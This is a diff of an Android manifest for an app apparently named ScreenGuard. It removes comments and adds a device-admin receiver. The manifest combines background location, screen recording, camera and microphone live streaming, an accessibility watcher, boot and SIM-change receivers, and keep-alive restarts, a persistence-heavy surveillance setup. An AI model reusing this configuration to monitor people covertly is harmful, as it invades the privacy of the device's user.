@@ -21,7 +21,7 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
 
-    <!-- Foreground Services (Android 14+) -->
+    <!-- Foreground Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
@@ -32,13 +32,13 @@
     <!-- Boot -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
 
-    <!-- Notifications (Android 13+) -->
+    <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
     <!-- Wake Lock -->
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
 
-    <!-- Battery Optimization -->
+    <!-- Battery -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
 
     <!-- Alarm -->
@@ -49,7 +49,7 @@
     <!-- Overlay -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
-    <!-- Storage (for saving files temporarily) -->
+    <!-- Storage -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
@@ -73,7 +73,6 @@
 
         <!-- ==================== ACTIVITIES ==================== -->
 
-        <!-- Main Activity -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
@@ -86,29 +85,25 @@
             </intent-filter>
         </activity>
 
-        <!-- Setup Activity -->
         <activity
             android:name=".ui.SetupActivity"
             android:exported="false"
             android:theme="@style/Theme.ScreenGuard"/>
 
-        <!-- Permission Activity -->
         <activity
             android:name=".ui.PermissionActivity"
             android:exported="false"
             android:theme="@style/Theme.ScreenGuard"/>
 
-        <!-- MediaProjection Consent Activity -->
         <activity
             android:name=".ui.MediaProjectionActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:launchMode="singleTop"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+            android:theme="@style/Theme.ScreenGuard.Transparent"/>
 
         <!-- ==================== SERVICES ==================== -->
 
-        <!-- Guard Service — Main Foreground Service -->
         <service
             android:name=".services.GuardService"
             android:enabled="true"
@@ -116,7 +111,6 @@
             android:foregroundServiceType="mediaProjection|camera|microphone|location|dataSync"
             android:stopWithTask="false"/>
 
-        <!-- Screen Record Service -->
         <service
             android:name=".services.ScreenRecordService"
             android:enabled="true"
@@ -124,7 +118,6 @@
             android:foregroundServiceType="mediaProjection"
             android:stopWithTask="false"/>
 
-        <!-- Live Stream Service -->
         <service
             android:name=".services.LiveStreamService"
             android:enabled="true"
@@ -132,7 +125,6 @@
             android:foregroundServiceType="mediaProjection|camera|microphone"
             android:stopWithTask="false"/>
 
-        <!-- Keep Alive Service -->
         <service
             android:name=".services.KeepAliveService"
             android:enabled="true"
@@ -140,7 +132,6 @@
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false"/>
 
-        <!-- Accessibility Watcher Service -->
         <service
             android:name=".services.AccessibilityWatcher"
             android:enabled="true"
@@ -157,7 +148,6 @@
 
         <!-- ==================== RECEIVERS ==================== -->
 
-        <!-- Boot Receiver -->
         <receiver
             android:name=".receivers.BootReceiver"
             android:enabled="true"
@@ -171,7 +161,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Alarm Receiver — For periodic service restart -->
         <receiver
             android:name=".receivers.AlarmReceiver"
             android:enabled="true"
@@ -181,7 +170,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Battery Receiver -->
         <receiver
             android:name=".receivers.BatteryReceiver"
             android:enabled="true"
@@ -193,7 +181,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Package Receiver -->
         <receiver
             android:name=".receivers.PackageReceiver"
             android:enabled="true"
@@ -205,7 +192,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- SIM Receiver -->
         <receiver
             android:name=".receivers.SimReceiver"
             android:enabled="true"
@@ -215,9 +201,26 @@
             </intent-filter>
         </receiver>
 
+        <!-- ⭐ DEVICE ADMIN RECEIVER — Ye zaroori hai -->
+        <receiver
+            android:name=".receivers.AdminReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:description="@string/admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+            </intent-filter>
+        </receiver>
+
         <!-- ==================== PROVIDERS ==================== -->
 
-        <!-- FileProvider — for sharing media files -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
@@ -228,7 +231,6 @@
                 android:resource="@xml/file_paths"/>
         </provider>
 
-        <!-- WorkManager Initialization -->
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="${applicationId}.androidx-startup"
